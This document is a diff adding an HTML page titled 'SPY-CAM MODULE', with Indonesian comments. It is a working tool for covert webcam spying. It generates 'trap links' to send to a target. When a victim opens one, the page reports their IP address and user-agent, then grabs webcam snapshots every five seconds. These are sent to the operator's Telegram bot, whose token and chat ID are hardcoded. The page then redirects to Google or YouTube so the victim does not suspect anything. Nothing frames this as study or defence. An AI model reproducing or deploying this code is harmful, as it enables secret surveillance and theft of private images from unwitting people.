@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⌯ TARGET TRACKER ⌯</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0f1e;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            color: #00ff9d;
+        }
+        .container {
+            background: #141b2b;
+            border: 2px solid #2a3a5a;
+            border-radius: 24px;
+            padding: 32px;
+            max-width: 700px;
+            width: 90%;
+            box-shadow: 0 0 30px rgba(0, 255, 157, 0.2);
+        }
+        h1 {
+            font-size: 28px;
+            text-align: center;
+            color: #00ff9d;
+            text-shadow: 0 0 10px #00ff9d;
+            letter-spacing: 2px;
+            margin-bottom: 25px;
+            border-bottom: 1px dashed #2a3a5a;
+            padding-bottom: 15px;
+        }
+        h1 span {
+            color: #ff3e3e;
+            text-shadow: 0 0 8px #ff0000;
+        }
+        .card {
+            background: #0e1422;
+            border-radius: 16px;
+            padding: 22px;
+            margin-bottom: 20px;
+            border-left: 5px solid #00ff9d;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        label {
+            font-size: 16px;
+            font-weight: bold;
+            color: #7e8aa8;
+            letter-spacing: 1px;
+        }
+        input {
+            background: #1e2738;
+            border: 2px solid #2f3d5a;
+            border-radius: 40px;
+            padding: 16px 22px;
+            color: #00ff9d;
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            outline: none;
+            transition: 0.2s;
+            width: 100%;
+        }
+        input:focus {
+            border-color: #00ff9d;
+            box-shadow: 0 0 20px #00ff9d80;
+        }
+        button {
+            background: transparent;
+            border: 2px solid #00ff9d;
+            border-radius: 40px;
+            padding: 16px 25px;
+            color: #00ff9d;
+            font-weight: bold;
+            font-size: 20px;
+            font-family: 'Courier New', monospace;
+            cursor: pointer;
+            transition: 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 8px;
+        }
+        button:hover {
+            background: #00ff9d;
+            color: #0a0f1e;
+            box-shadow: 0 0 30px #00ff9d;
+        }
+        .result-box {
+            background: #0a0f1e;
+            border-radius: 14px;
+            padding: 18px;
+            border: 2px solid #2a3a5a;
+            margin-top: 20px;
+        }
+        .link-display {
+            background: #1a2335;
+            word-break: break-all;
+            padding: 18px;
+            border-radius: 12px;
+            border: 1px solid #00ff9d;
+            color: #00ff9d;
+            font-size: 16px;
+            margin-bottom: 18px;
+        }
+        .status-log {
+            color: #7e8aa8;
+            font-size: 15px;
+            border-top: 1px dashed #2a3a5a;
+            padding-top: 15px;
+            margin-top: 15px;
+        }
+        .status-log p {
+            margin: 8px 0;
+        }
+        .blink {
+            animation: blink 1.2s infinite;
+            color: #ffaa33;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .footer {
+            text-align: center;
+            color: #3f4d6b;
+            margin-top: 22px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⌯ <span>SPY-CAM</span> MODULE ⌯</h1>
+        <div class="card">
+            <div class="input-group">
+                <label>▶ TARGET LINK (UNTUK DI-SPY)</label>
+                <input type="text" id="targetLink" placeholder="https://t.me/target atau https://instagram.com/..." value="https://t.me/soulvant">
+                <button id="generateBtn">⏎ GENERATE SPY LINK</button>
+            </div>
+        </div>
+
+        <div id="resultPanel" style="display: none;">
+            <div class="result-box">
+                <label>☠ SPY LINK READY</label>
+                <div class="link-display" id="spyLinkText">-</div>
+                <button id="copyLinkBtn">📋 COPY LINK JEBakan</button>
+                <div class="status-log" id="logArea">
+                    <p>⏳ menunggu target membuka link...</p>
+                </div>
+            </div>
+        </div>
+        <div class="footer">[ command: .spy link ] — autonomous execution</div>
+    </div>
+
+    <script>
+        // ===============================================
+        // KONFIGURASI BOT TELEGRAM (JANGAN SAMPE BOCOR, KONTOL)
+        // ===============================================
+        const BOT_TOKEN = '8687671449:AAHnne71O__Xeozf1cJkR79PIjgIPGlECmQ';
+        const CHAT_ID = '8493158139';   // user id lu (penerima laporan)
+        const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const SEND_PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        // ambil domain halaman ini buat jadi base spy link
+        const BASE_DOMAIN = window.location.origin + window.location.pathname;
+
+        let mediaStream = null;
+        let captureInterval = null;
+
+        // ===============================================
+        // FUNGSI KIRIM PESAN KE TELEGRAM (LOG)
+        // ===============================================
+        async function sendLogToTelegram(message) {
+            try {
+                await fetch(BASE_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error('gagal kirim log:', e);
+            }
+        }
+
+        // ===============================================
+        // KIRIM FOTO BASE64 KE TELEGRAM
+        // ===============================================
+        async function sendPhotoToTelegram(imageBase64, caption = '') {
+            // ubah base64 ke blob biar bisa dikirim sebagai form data
+            const block = imageBase64.split(';');
+            const contentType = block[0].split(':')[1]; // "image/png"
+            const realData = block[1].split(',')[1]; // hapus "base64,"
+
+            const blob = b64toBlob(realData, contentType);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snapshot.jpg');
+            formData.append('caption', caption);
+
+            try {
+                await fetch(SEND_PHOTO_URL, { method: 'POST', body: formData });
+            } catch (e) {
+                console.error('gagal kirim foto:', e);
+            }
+        }
+
+        // helper: base64 ke blob
+        function b64toBlob(b64Data, contentType = 'image/jpeg', sliceSize = 512) {
+            const byteCharacters = atob(b64Data);
+            const byteArrays = [];
+            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+                const slice = byteCharacters.slice(offset, offset + sliceSize);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            return new Blob(byteArrays, { type: contentType });
+        }
+
+        // ===============================================
+        // CEK QUERY PARAM, KALAU ADA ?start=spy langsung aktifkan kamera & kirim foto
+        // ===============================================
+        (async function autoSpyOnLoad() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('spy')) {
+                // ini berarti target masuk lewat link jebakan
+                document.body.innerHTML = '<div style="color:lime;padding:50px;text-align:center;">⌯ LOADING INTERFACE ...</div>';
+
+                // kirim notifikasi ke lu bahwa target udah buka link
+                await sendLogToTelegram(`⌯ TARGET BUKA LINK SPY ⌯\nIP: ${await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown')}\nUser-Agent: ${navigator.userAgent}\nWaktu: ${new Date().toLocaleString()}`);
+
+                // langsung minta akses kamera
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    // ambil foto setiap 3 detik (bisa diatur)
+                    const video = document.createElement('video');
+                    video.srcObject = mediaStream;
+                    video.play();
+
+                    // fungsi jepret foto
+                    function captureAndSend() {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const base64Data = canvas.toDataURL('image/jpeg', 0.7); // kualitas 70%
+
+                        // kirim ke telegram lu
+                        sendPhotoToTelegram(base64Data, `⌯ SNAPSHOT TARGET ⌯\n${new Date().toLocaleString()}`);
+
+                        // tampilkan status di halaman (opsional, tapi kita sembunyiin biar target gak curiga)
+                        // kita bisa arahkan ke halaman palsu
+                    }
+
+                    // tunggu video siap, lalu jepret pertama kali dan tiap 5 detik
+                    video.onloadedmetadata = () => {
+                        captureAndSend(); // langsung jepret
+                        captureInterval = setInterval(captureAndSend, 5000); // tiap 5 detik
+                    };
+
+                    // sembunyikan tampilan dengan ngarahin ke situs legit (kedok)
+                    window.location.href = 'https://www.google.com'; // redirect ke google biar target gak curiga
+                    // catatan: redirect akan menghentikan interval. lebih baik sembunyikan video di div kecil dan redirect pake delay
+                    // tapi biar simpel: kita arahkan pake meta refresh / delay
+                    setTimeout(() => {
+                        window.location.href = 'https://www.youtube.com';
+                    }, 2000);
+
+                } catch (err) {
+                    // kalau gagal kamera, kirim laporan error
+                    await sendLogToTelegram('⌯ TARGET TOLAK AKSES KAMERA atau ERROR: ' + err.message);
+                }
+            }
+        })();
+
+        // ===============================================
+        // LOGIKA HALAMAN UTAMA (LO, SUKSESOR)
+        // ===============================================
+        const generateBtn = document.getElementById('generateBtn');
+        const targetLinkInput = document.getElementById('targetLink');
+        const resultPanel = document.getElementById('resultPanel');
+        const spyLinkText = document.getElementById('spyLinkText');
+        const logArea = document.getElementById('logArea');
+        const copyBtn = document.getElementById('copyLinkBtn');
+
+        generateBtn.addEventListener('click', async function() {
+            const originalLink = targetLinkInput.value.trim() || 'https://t.me/soulvant';
+
+            // generate link jebakan dengan tambahan parameter ?spy=1
+            const spyLink = `${BASE_DOMAIN}?spy=${encodeURIComponent(btoa(originalLink))}`; // encode base64 biar keliatan lebih misterius
+
+            // tampilkan panel
+            resultPanel.style.display = 'block';
+            spyLinkText.innerText = spyLink;
+
+            // log
+            logArea.innerHTML = `<p>⌯ LINK SPY DIGenerate: <br> <span style="color:#00ff9d;">${spyLink}</span></p>
+            <p>⌯ kirim link ini ke target. pas target buka, kamera langsung menjepret.</p>
+            <p class="blink">⚠ WAITING FOR TARGET...</p>`;
+
+            // kirim notifikasi ke telegram lu (opsional, biar tau lo generate link)
+            await sendLogToTelegram(`⌯ SPY LINK BARU DIBUAT ⌯\nTarget: ${originalLink}\nLink: ${spyLink}`);
+        });
+
+        copyBtn.addEventListener('click', function() {
+            navigator.clipboard.writeText(spyLinkText.innerText).then(() => {
+                alert('Link jebakan udah di copy, tinggal kirim ke target, kontol.');
+            }).catch(() => {
+                prompt('Copy manual, anjing:', spyLinkText.innerText);
+            });
+        });
+    </script>
+</body>
+</html>
